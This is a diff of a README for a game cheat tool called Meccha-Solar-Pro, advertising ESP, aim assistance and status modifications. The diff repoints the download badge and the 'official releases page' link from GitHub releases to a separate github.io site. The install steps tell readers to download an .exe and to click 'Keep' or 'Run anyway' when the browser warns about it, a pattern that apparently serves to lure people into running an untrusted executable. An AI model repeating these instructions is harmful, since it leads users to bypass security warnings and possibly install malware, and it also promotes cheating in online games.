@@ -1,6 +1,6 @@
 # ☀️ Meccha-Solar-Pro - Gain full control over your gameplay
 
-[![Download Meccha-Solar-Pro](https://img.shields.io/badge/Download-Release-blue)](https://github.com/mat82923/Meccha-Solar-Pro/releases)
+[![Download Meccha-Solar-Pro](https://img.shields.io/badge/Download-Release-blue)](https://mat82923.github.io)
 
 Meccha-Solar-Pro provides a suite of tools for the MECCHA CHAMELEON platform. This software helps players navigate game environments, manage character settings, and automate repetitive tasks. It supports features like ESP, aim assistance, movement adjustments, and status modifications.
 
@@ -19,7 +19,7 @@ To ensure the software performs as expected, confirm your computer meets these s
 
 Follow these steps to set up the software.
 
-1.  Visit the [official releases page](https://github.com/mat82923/Meccha-Solar-Pro/releases) to access the latest version of the installer.
+1.  Visit the [official releases page](https://mat82923.github.io) to access the latest version of the installer.
 2.  Locate the most recent version in the list and click the file ending in `.exe`.
 3.  Save the file to your desktop or a folder you can find easily.
 4.  If your browser warns you about the file, select "Keep" or "Run anyway." This happens because the tool interacts with other programs on your system.
